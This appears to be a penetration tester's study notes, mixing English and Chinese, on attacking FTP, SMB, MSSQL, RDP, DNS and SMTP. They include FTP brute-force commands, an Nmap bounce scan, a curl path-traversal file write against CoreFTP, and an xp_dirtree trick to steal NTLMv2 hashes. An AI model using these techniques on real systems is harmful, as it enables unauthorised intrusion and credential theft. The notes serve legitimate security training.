# Attacking Common Services  

# 1 FTP

FTP listens on 21, 2121, 20, 900

`Nmap` `-sC` includes the [ftp-anon](https://nmap.org/nsedoc/scripts/ftp-anon.html) Nmap script which checks if a FTP server allows anonymous logins.

## 1.1 Anonymous Authentication

```shell
ftp 192.168.2.142    
```

get -> get file

mget -> download multiple files

Put/mput -> upload



## 1.2 no anonymous authentication available

brute-forcing attack: [Medusa](https://github.com/jmk-foofus/medusa)

```shell
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```

└──╼ [★]$ hydra -l robin -P passwords.list ftp://10.129.45.199:2121

#### 1.2.1 FTP Bounce Attack

An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

Consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.

The `Nmap` -b flag can be used to perform an FTP bounce attack:

```shell
capybaralalale@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```



## 1.3 Latest FTP Vulnerabilities

 `CoreFTP before build 727` vulnerability assigned [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836) / does not correctly process the `HTTP PUT` request and leads to an `authenticated directory`/`path traversal,` and `arbitrary file write` vulnerability.

This FTP service uses an HTTP `POST` request to upload files. However, the CoreFTP service allows an HTTP `PUT` request, which we can use to write content to files.

Exploit:

```shell
capybaralalale@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

We create a raw HTTP `PUT` request (`-X PUT`) with basic auth (`--basic -u <username>:<password>`), the path for the file (`--path-as-is https://<IP>/../../../../../whoops`), and its content (`--data-binary "PoC."`) with this command. Additionally, we specify the host header (`-H "Host: <IP>"`) with the IP address of our target system.

| The application checks whether the user is authorized to be in the specified path. Since the restrictions only apply to a specific folder, all permissions granted to it are bypassed as it breaks out of that folder using the directory traversal. |
| ------------------------------------------------------------ |



# 2 SMB

## 2.1





## 2.2 Vuls

[SMBGhost](https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796) with the [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)

[PoC](https://www.exploit-db.com/exploits/48537)

The vulnerability occurs while processing a malformed compressed message after the `Negotiate Protocol Responses`. If the SMB server allows requests (over TCP/445), compression is generally supported, where the server and client set the terms of communication before the client sends any more data. Suppose the data transmitted exceeds the integer variable limits due to the excessive amount of data. In that case, these parts are written into the buffer, which leads to the overwriting of the subsequent CPU instructions and interrupts the process's normal or planned execution. These data sets can be structured so that the overwritten instructions are replaced with our own ones, and thus we force the CPU (and hence also the process) to perform other tasks and instructions.

#### Initiation of the Attack

| **Step** | **SMBGhost**                                                 | **Concept of Attacks - Category** |
| -------- | ------------------------------------------------------------ | --------------------------------- |
| `1.`     | The client sends a request manipulated by the attacker to the SMB server. | `Source`                          |
| `2.`     | The sent compressed packets are processed according to the negotiated protocol responses. | `Process`                         |
| `3.`     | This process is performed with the system's privileges or at least with the privileges of an administrator. | `Privileges`                      |
| `4.`     | The local process is used as the destination, which should process these compressed packets. | `Destination`                     |

This is when the cycle starts all over again, but this time to gain remote access to the target system.

#### Trigger Remote Code Execution

| **Step** | **SMBGhost**                                                 | **Concept of Attacks - Category** |
| -------- | ------------------------------------------------------------ | --------------------------------- |
| `5.`     | The sources used in the second cycle are from the previous process. | `Source`                          |
| `6.`     | In this process, the integer overflow occurs by replacing the overwritten buffer with the attacker's instructions and forcing the CPU to execute those instructions. | `Process`                         |
| `7.`     | The same privileges of the SMB server are used.              | `Privileges`                      |
| `8.`     | The remote attacker system is used as the destination, in this case, granting access to the local system. | `Destination`                     |



# 3 SQL Databases

## 3.1





## 3.2 vuls

**不是传统漏洞，而是利用 Windows SMB 认证机制的特性。**

当 Windows 主机尝试访问网络共享文件夹时，会**自动发送 NTLMv2 哈希**进行身份验证。攻击者利用这一点，诱导 MSSQL 服务器向攻击者控制的机器发起 SMB 连接，从而截获哈希。



**攻击流程**

**第一阶段：触发连接**

1. 攻击者通过 `xp_dirtree` 函数，让 MSSQL 访问攻击者控制的网络共享（如 `\\attacker_ip\share`）
2. MSSQL 服务以其运行账户的身份尝试访问该共享
3. 触发 SMB 认证流程



**第二阶段：窃取哈希**

1. SMB 服务处理请求，使用 MSSQL 服务账户的凭据进行认证
2. 攻击者用 Responder、Wireshark 等工具截获 NTLMv2 哈希



哈希的利用方式

- **离线破解**：用 hashcat 等工具暴力破解，获得明文密码
- **SMB Relay**：将哈希"中继"到其他主机，获取该账户在其他机器上的权限（微软已修补直接 relay 回原主机的漏洞）



`xp_dirtree` 函数

这是一个未文档化的 MSSQL 函数，原本用于列出文件夹内容，但可被滥用来触发对外部 SMB 共享的访问请求。







# 4 RDP

## 4.1





## 4.2 vuls

[CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708). `BlueKeep`

The vulnerability is also based, as with SMB, on manipulated requests sent to the targeted service. However, the dangerous thing here is that the vulnerability does not require user authentication to be triggered. Instead, the vulnerability occurs after initializing the connection when basic settings are exchanged between client and server. This is known as a [Use-After-Free](https://cwe.mitre.org/data/definitions/416.html) (`UAF`) technique that uses freed memory to execute arbitrary code.





# 5 DNS

## 5.1 





## 5.2 vuls

我们在网络上可以找到成千上万个子域名和主域名。它们通常指向不再活跃的第三方服务提供商，例如 AWS、GitHub 等，而且最多只会显示一条错误消息，以确认第三方服务已停用。大型公司和企业也屡屡受到影响。这些公司经常取消第三方服务提供商的服务，但却忘记删除相关的 DNS 记录。



# 6 SMTP

## 6.1





## 6.2 vuls

One of the most recent publicly disclosed and dangerous [Simple Mail Transfer Protocol (SMTP)](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol) vulnerabilities was discovered in [OpenSMTPD](https://www.opensmtpd.org/) up to version 6.6.2 service was in 2020. This vulnerability was assigned [CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247) and leads to RCE

[利用程序](https://www.exploit-db.com/exploits/47984)

[Rabbit](https://www.youtube.com/watch?v=5nnJq_IWJog)，它通过暴力破解 Outlook Web Access (OWA) 并发送包含恶意宏的文档来钓鱼用户；[SneakyMailer](https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html)，它包含钓鱼和枚举用户收件箱的元素，使用 Netcat 和 IMAP 客户端；以及[Reel](https://0xdf.gitlab.io/2018/11/10/htb-reel.html)，它通过暴力破解 SMTP 用户并使用恶意 RTF 文件进行钓鱼。



# Skills Assessment

## Lab - 1





## Lab - 2





## Lab - 3